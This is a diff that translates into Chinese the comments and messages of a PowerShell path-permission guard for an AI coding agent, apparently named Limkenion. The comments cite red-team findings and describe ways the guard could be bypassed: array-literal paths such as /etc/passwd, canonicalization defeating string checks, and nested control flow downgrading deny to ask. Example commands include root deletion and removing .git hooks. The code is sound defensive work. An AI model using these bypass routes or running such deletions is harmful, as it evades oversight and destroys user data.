+      // 规则。配置了 Edit(.git/**) 时，`'.git/hooks/pre-commit' | Remove-Item`
+      // 应当 DENY（而非 ask）。剥离首尾引号（字符串字面量在 .text 中是
+      // 带引号的），并送入与 ::/反引号路径相同的 deny 猜测辅助函数。
       if (pipelineSourceText !== undefined) {
         const stripped = pipelineSourceText.replace(/^['"]|['"]$/g, '')
         const denyHit = checkDenyRuleForGuessedPath(
@@ -1667,45 +1637,42 @@ function checkPathConstraintsForStatement(
         if (denyHit) {
           return {
             behavior: 'deny',
-            message: `${canonical} targeting '${denyHit.resolvedPath}' was blocked by a deny rule`,
+            message: `针对 '${denyHit.resolvedPath}' 的 ${canonical} 已被 deny 规则阻止`,
             decisionReason: { type: 'rule', rule: denyHit.rule },
           }
         }
       }
       firstAsk ??= {
         behavior: 'ask',
-        message: `${canonical} receives its path from a pipeline expression source that cannot be statically validated and requires manual approval`,
+        message: `${canonical} 从无法静态校验的管道表达式源获取路径，需要人工审批`,
       }
-      // Don't continue — fall through to path loop so deny rules on
-      // extracted paths are still checked.
+      // 不要 continue——继续进入路径循环，这样提取出路径上的 deny 规则
+      // 仍会被检查。
     }
 
-    // SECURITY: Array literals, subexpressions, and other complex
-    // argument types cannot be statically validated. An array literal
-    // like `-Path ./safe.txt, /etc/passwd` produces a single 'Other'
-    // element whose combined text may resolve within CWD while
-    // PowerShell actually writes to ALL paths in the array.
+    // 安全：数组字面量、子表达式和其他复杂参数类型无法静态校验。
+    // 像 `-Path ./safe.txt, /etc/passwd` 这样的数组字面量会产生单个
+    // 'Other' 元素，其合并文本可能解析在 CWD 内，而 PowerShell 实际会
+    // 写入数组中的【所有】路径。
     if (hasUnvalidatablePathArg) {
       const canonical = resolveToCanonical(cmd.name)
       firstAsk ??= {
         behavior: 'ask',
-        message: `${canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval`,
+        message: `${canonical} 使用了无法静态校验的参数或复杂路径表达式（数组字面量、子表达式、未知参数等），需要人工审批`,
       }
-      // Don't continue — fall through to path loop so deny rules on
-      // extracted paths are still checked.
+      // 不要 continue——继续进入路径循环，这样提取出路径上的 deny 规则
+      // 仍会被检查。
     }
 
-    // SECURITY: Write cmdlet in CMDLET_PATH_CONFIG that extracted zero paths.
-    // Either (a) the cmdlet has no args at all (`Remove-Item` alone —
-    // PowerShell will error, but we shouldn't optimistically assume that), or
-    // (b) we failed to recognize the path among the args (shouldn't happen
-    // with the unknown-param fail-safe, but defense-in-depth). Conservative:
-    // write operation with no validated target → ask.
-    // Read cmdlets and pop-location (pathParams: []) are exempt.
-    // optionalWrite cmdlets (Invoke-WebRequest/Invoke-RestMethod without
-    // -OutFile) are ALSO exempt — they only write to disk when a pathParam is
-    // present; without one, output goes to the pipeline. The
-    // hasUnvalidatablePathArg check above already covers unknown-param cases.
+    // 安全：CMDLET_PATH_CONFIG 中属于写 cmdlet 却提取出零路径的情况。
+    // 要么（a）cmdlet 完全没有参数（单独一个 `Remove-Item`——
+    // PowerShell 会报错，但我们不应乐观地假设如此），要么
+    //（b）我们未能从参数中识别出路径（有了未知参数兜底不应发生，
+    // 但属于纵深防御）。保守做法：没有经过校验目标的写操作 → ask。
+    // 读 cmdlet 和 pop-location（pathParams: []）豁免。
+    // optionalWrite cmdlet（不带 -OutFile 的 Invoke-WebRequest/Invoke-RestMethod）
+    //【同样】豁免——它们只有在存在 pathParam 时才写入磁盘；没有则输出
+    // 进入管道。上面的 hasUnvalidatablePathArg 检查已覆盖未知参数情况。
     if (
       operationType !== 'read' &&
       !optionalWrite &&
@@ -1715,23 +1682,24 @@ function checkPathConstraintsForStatement(
       const canonical = resolveToCanonical(cmd.name)
       firstAsk ??= {
         behavior: 'ask',
-        message: `${canonical} is a write operation but no target path could be determined; requires manual approval`,
+        message: `${canonical} 是写操作，但无法确定目标路径；需要人工审批`,
       }
       continue
     }
 
-    // SECURITY: bash-parity hard-deny for removal cmdlets on
-    // system-critical paths. BashTool has isDangerousRemovalPath which
-    // hard-DENIES `rm /`, `rm ~`, `rm /etc`, etc. regardless of user config.
-    // Port: remove-item (and aliases rm/del/ri/rd/rmdir/erase → resolveToCanonical)
-    // on a dangerous path → deny (not ask). User cannot approve system32 deletion.
+    // 安全：对系统关键路径上的删除 cmdlet 运用 bash 对齐的硬 deny。
+    // BashTool 有 isDangerousRemovalPath，它会无视用户配置对 `rm /`、
+    // `rm ~`、`rm /etc` 等施以硬 DENY。移植：对危险路径上的 remove-item
+    //（以及 rm/del/ri/rd/rmdir/erase 等别名 → resolveToCanonical）→ deny
+    //（而非 ask）。用户不能批准删除 system32。
     const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'
 
     for (const filePath of paths) {
-      // Hard-deny removal of dangerous system paths (/, ~, /etc, etc.).
-      // Check the RAW path (pre-realpath) first: safeResolvePath can
-      // canonicalize '/' → 'C:\' (Windows) or '/var/...' → '/private/var/...'
-      // (macOS) which defeats isDangerousRemovalPath's string comparisons.
+      // 对危险系统路径（/、~、/etc 等）施以硬 deny 的删除。
+      // 先检查【原始】路径（realpath 之前）：safeResolvePath 可能把
+      // '/' 规范化成 'C:\'（Windows）或把 '/var/...' 规范化成
+      // '/private/var/...'（macOS），这会绕过 isDangerousRemovalPath 的
+      // 字符串比较。
       if (isRemoval && isDangerousRemovalRawPath(filePath)) {
         return dangerousRemovalDeny(filePath)
       }
@@ -1743,8 +1711,7 @@ function checkPathConstraintsForStatement(
         operationType,
       )
 
-      // Also check the resolved path — catches symlinks that resolve to a
-      // protected location.
+      // 也检查解析后的路径——捕获解析到受保护位置的符号链接。
       if (isRemoval && isDangerousRemovalPath(resolvedPath)) {
         return dangerousRemovalDeny(resolvedPath)
       }
@@ -1760,7 +1727,7 @@ function checkPathConstraintsForStatement(
           decisionReason?.type === 'other' ||
           decisionReason?.type === 'safetyCheck'
             ? decisionReason.reason
-            : `${canonical} targeting '${resolvedPath}' was blocked. For security, Limkenion may only access files in the allowed working directories for this session: ${dirListStr}.`
+            : `针对 '${resolvedPath}' 的 ${canonical} 已被阻止。出于安全考虑，Limkenion 只能访问本会话允许的工作目录中的文件：${dirListStr}。`
 
         if (decisionReason?.type === 'rule') {
           return {
@@ -1808,7 +1775,7 @@ function checkPathConstraintsForStatement(
     }
   }
 
-  // Also check nested commands from control flow
+  // 也要检查控制流中的嵌套命令
   if (statement.nestedCommands) {
     for (const cmd of statement.nestedCommands) {
       const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
@@ -1818,13 +1785,13 @@ function checkPathConstraintsForStatement(
         const canonical = resolveToCanonical(cmd.name)
         firstAsk ??= {
           behavior: 'ask',
-          message: `${canonical} uses a parameter or complex path expression (array literal, subexpression, unknown parameter, etc.) that cannot be statically validated and requires manual approval`,
+          message: `${canonical} 使用了无法静态校验的参数或复杂路径表达式（数组字面量、子表达式、未知参数等），需要人工审批`,
         }
-        // Don't continue — fall through to path loop for deny checks.
+        // 不要 continue——继续进入路径循环做 deny 检查。
       }
 
-      // SECURITY: Write cmdlet with zero extracted paths (mirrors main loop).
-      // optionalWrite cmdlets exempt — see main-loop comment.
+      // 安全：提取出零路径的写 cmdlet（与主循环一致）。
+      // optionalWrite cmdlet 豁免——参见主循环注释。
       if (
         operationType !== 'read' &&
         !optionalWrite &&
@@ -1834,19 +1801,19 @@ function checkPathConstraintsForStatement(
         const canonical = resolveToCanonical(cmd.name)
         firstAsk ??= {
           behavior: 'ask',
-          message: `${canonical} is a write operation but no target path could be determined; requires manual approval`,
+          message: `${canonical} 是写操作，但无法确定目标路径；需要人工审批`,
         }
         continue
       }
 
-      // SECURITY: bash-parity hard-deny for removal on system-critical
-      // paths — mirror the main-loop check above. Without this,
-      // `if ($true) { Remove-Item / }` routes through nestedCommands and
-      // downgrades deny→ask, letting the user approve root deletion.
+      // 安全：对系统关键路径上的删除运用 bash 对齐的硬 deny——
+      // 与上面主循环的检查一致。没有它，`if ($true) { Remove-Item / }`
+      // 会经由 nestedCommands 路径执行，并把 deny→ask 降级，让用户
+      // 批准根目录删除。
       const isRemoval = resolveToCanonical(cmd.name) === 'remove-item'
 
       for (const filePath of paths) {
-        // Check the RAW path first (pre-realpath); see main-loop comment.
+        // 先检查【原始】路径（realpath 之前）；参见主循环注释。
         if (isRemoval && isDangerousRemovalRawPath(filePath)) {
           return dangerousRemovalDeny(filePath)
         }
@@ -1873,7 +1840,7 @@ function checkPathConstraintsForStatement(
             decisionReason?.type === 'other' ||
             decisionReason?.type === 'safetyCheck'
               ? decisionReason.reason
-              : `${canonical} targeting '${resolvedPath}' was blocked. For security, Limkenion may only access files in the allowed working directories for this session: ${dirListStr}.`
+              : `针对 '${resolvedPath}' 的 ${canonical} 已被阻止。出于安全考虑，Limkenion 只能访问本会话允许的工作目录中的文件：${dirListStr}。`
 
           if (decisionReason?.type === 'rule') {
             return {
@@ -1920,21 +1887,20 @@ function checkPathConstraintsForStatement(
         }
       }
 
-      // Red-team P11/P14: step 5 at powershellPermissions.ts:970 already
-      // catches this via the same synthetic-CommandExpressionAst mechanism —
-      // this is belt-and-suspenders so the nested loop doesn't rely on that
-      // accident. Placed AFTER the path loop so specific asks (blockedPath,
-      // suggestions) win via ??=.
+      // 红队 P11/P14：powershellPermissions.ts:970 的第 5 步已经通过同样的
+      // synthetic-CommandExpressionAst 机制捕获此情况——这里是双保险，
+      // 使嵌套循环不依赖那个偶然。放在路径循环【之后】，让更具体的 ask
+      //（blockedPath、suggestions）通过 ??= 胜出。
       if (hasExpressionPipelineSource) {
         firstAsk ??= {
           behavior: 'ask',
-          message: `${resolveToCanonical(cmd.name)} appears inside a control-flow or chain statement where piped expression sources cannot be statically validated and requires manual approval`,
+          message: `${resolveToCanonical(cmd.name)} 出现在控制流或链式语句中，其中被管道的表达式源无法静态校验，需要人工审批`,
         }
       }
     }
   }
 
-  // Check redirections on nested commands (e.g., from && / || chains)
+  // 检查嵌套命令上的重定向（例如来自 && / || 链）
   if (statement.nestedCommands) {
     for (const cmd of statement.nestedCommands) {
       if (cmd.redirections) {
@@ -1960,7 +1926,7 @@ function checkPathConstraintsForStatement(
               decisionReason?.type === 'other' ||
               decisionReason?.type === 'safetyCheck'
                 ? decisionReason.reason
-                : `Output redirection to '${resolvedPath}' was blocked. For security, Limkenion may only write to files in the allowed working directories for this session: ${dirListStr}.`
+                : `输出重定向到 '${resolvedPath}' 已被阻止。出于安全考虑，Limkenion 只能写入本会话允许的工作目录中的文件：${dirListStr}。`
 
             if (decisionReason?.type === 'rule') {
               return {
@@ -1989,7 +1955,7 @@ function checkPathConstraintsForStatement(
     }
   }
 
-  // Check file redirections
+  // 检查文件重定向
   if (statement.redirections) {
     for (const redir of statement.redirections) {
       if (redir.isMerging) continue
@@ -2013,7 +1979,7 @@ function checkPathConstraintsForStatement(
           decisionReason?.type === 'other' ||
           decisionReason?.type === 'safetyCheck'
             ? decisionReason.reason
-            : `Output redirection to '${resolvedPath}' was blocked. For security, Limkenion may only write to files in the allowed working directories for this session: ${dirListStr}.`
+            : `输出重定向到 '${resolvedPath}' 已被阻止。出于安全考虑，Limkenion 只能写入本会话允许的工作目录中的文件：${dirListStr}。`
 
         if (decisionReason?.type === 'rule') {
           return {
@@ -2043,7 +2009,7 @@ function checkPathConstraintsForStatement(
   return (
     firstAsk ?? {
       behavior: 'passthrough',
-      message: 'All path constraints validated successfully',
+      message: '所有路径约束均已成功校验',
     }
   )
 }
